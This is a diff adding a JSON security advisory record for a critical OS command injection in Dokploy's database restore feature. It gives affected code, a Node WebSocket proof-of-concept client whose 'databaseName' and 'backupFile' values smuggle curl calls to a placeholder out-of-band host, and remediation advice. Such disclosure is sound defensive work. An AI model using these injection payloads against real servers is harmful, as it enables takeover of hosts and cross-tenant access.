@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-2xjq-p4xx-5x2p",
+  "repo": {
+    "cve_id": "CVE-2026-72733",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "| | |\r\n|---|---|\r\n| **Affected version** | v0.29.8 (commit `e9a0932b2`) |\r\n| **Component** | `@dokploy/server` - database restore command builder |\r\n| **Authentication** | Authenticated; `member` with service backup-restore permission |\r\n| **Status** | Confirmed via out-of-band code execution (Burp Collaborator) - both fields |\r\n\r\n## 1. Summary\r\nThe \"restore backup\" feature builds a shell pipeline in which the restore input `databaseName` is\r\ninterpolated **unquoted** (`-d ${database}`) and `backupFile` is interpolated into a double-quoted\r\n`rclone` argument (where `$(...)` still expands). Both inputs are unvalidated. Crucially, **no running\r\ncontainer or valid backup file is required**: the container-search subcommand ends in `| head -n 1`\r\n(exit code 0), so the `&&` does not short-circuit, and the outer shell expands the `$(...)` while\r\nbuilding the pipeline. Calling the restore endpoint yields OS command execution on the host.\r\n\r\n## 2. Affected code\r\n- **Sink** - `packages/server/src/utils/restore/utils.ts:10` (postgres; mariadb `:18`, mysql `:25`,\r\n  mongo `:33` are analogous, all unquoted `-d ${database}`):\r\n  ```js\r\n  `docker exec -i $CONTAINER_ID sh -c \"pg_restore -U '${databaseUser}' -d ${database} -O --clean --if-exists\"`\r\n  ```\r\n  and `backupFile` in `utils/restore/postgres.ts:21`:\r\n  ```js\r\n  const rcloneCommand = `rclone cat ${flags} \"${bucketPath}/${backupInput.backupFile}\" | gunzip`;\r\n  ```\r\n  Assembled by `getRestoreCommand` (`restore/utils.ts`) as\r\n  `CONTAINER_ID=$(docker ps ... | head -n 1) && ${rcloneCommand} | ${restoreCommand}`.\r\n- **Execution** - `utils/restore/postgres.ts:42-44` `execAsync(command)` / `execAsyncRemote`.\r\n- **No-precondition reachability** - `getServiceContainerCommand` ends with `| head -n 1`, so\r\n  `CONTAINER_ID=$(...)` exits 0 even with no container; the pipeline (and therefore the `$(...)`\r\n  expansion in both `databaseName` and `backupFile`) runs regardless of container/backup existence.\r\n- **Entry point (no validation)** - `apiRestoreBackup` (`db/schema/backups.ts:211`):\r\n  `databaseName: z.string().min(1)`, `backupFile: z.string().min(1)`, no regex.\r\n\r\n## 3. Transport & authorization\r\n`backup.restoreBackupWithLogs` (`apps/dokploy/server/api/routers/backup.ts:556`) is a **tRPC\r\nsubscription** delivered over a **WebSocket** at `ws://TARGET/drawer-logs` (the `wsLink` transport),\r\nauthenticated by the session cookie on the upgrade request. The handler runs\r\n`checkServicePermissionAndAccess` only when `input.databaseId` is set (no org check for owner/admin).\r\nReachable by a `member` with backup-restore on the target DB, and cross-tenant by an owner/admin.\r\n\r\n## 4. Proof of Concept\r\nThe injection rides a WebSocket subscription (not a plain HTTP request). Below is a minimal Node `ws`\r\nclient; any tRPC-over-WebSocket client works. HTTP setup (login, create DB + destination) is done via\r\nBurp as in DOKPLOY-RCE-003 Step 0-2/4.\r\n\r\n**Prereqs:** a `databaseId` (e.g. a PostgreSQL service you own) and a `destinationId`.\r\n\r\n**WebSocket subscription (the injection):**\r\n```js\r\nconst WebSocket = require('ws');\r\nconst ws = new WebSocket('ws://TARGET/drawer-logs', {\r\n  headers: { Cookie: 'better-auth.session_token=COOKIE' }\r\n});\r\nconst input = { json: {\r\n  databaseId: 'PG_ID',\r\n  databaseType: 'postgres',\r\n  backupType: 'database',\r\n  databaseName: 'x$(curl http://COLLAB/dbname)',\r\n  backupFile:   'b$(curl http://COLLAB/bfile)',\r\n  destinationId: 'DEST_ID',\r\n}};\r\nws.on('open', () => ws.send(JSON.stringify({\r\n  id: 1, method: 'subscription',\r\n  params: { path: 'backup.restoreBackupWithLogs', input }\r\n})));\r\nws.on('message', d => console.log(d.toString()));\r\n```\r\n\r\n**Observe.** The Collaborator receives **both** `GET /dbname` and `GET /bfile`\r\n(`User-Agent: curl/8.18.0`) from the Dokploy host. The subscription's own error message echoes the\r\nfully-expanded command and curl's transfer meter (`100 57 100 57`), confirming execution.\r\n\r\n## 5. Impact\r\nArbitrary OS command execution on the host (or `serverId`) as the Dokploy/Docker-privileged process,\r\nwith no requirement for an existing database container or valid backup. Cross-tenant via owner/admin.\r\n\r\n## 6. Remediation\r\n- Validate `databaseName` (`^[A-Za-z0-9_]+$`) and `backupFile` (path/object-key allow-list); reject\r\n  shell metacharacters. Quote/escape every interpolated value and prefer `execFile`/argument arrays.\r\n- Make the container-search a hard precondition (fail closed) and enforce tenant isolation.\r\n\r\n## Appendix A - Authentication\r\n```http\r\nPOST /api/auth/sign-in/email HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"email\":\"USER@EXAMPLE.COM\",\"password\":\"PASSWORD\"}\r\n```",
+    "ghsa_id": "GHSA-2xjq-p4xx-5x2p",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-2xjq-p4xx-5x2p",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-2xjq-p4xx-5x2p"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72733"
+      }
+    ],
+    "published_at": "2026-07-21T23:24:03Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "OS Command Injection via `databaseName` / `backupFile` in database restore",
+    "updated_at": "2026-08-10T17:19:04Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "< 0.29.8 "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
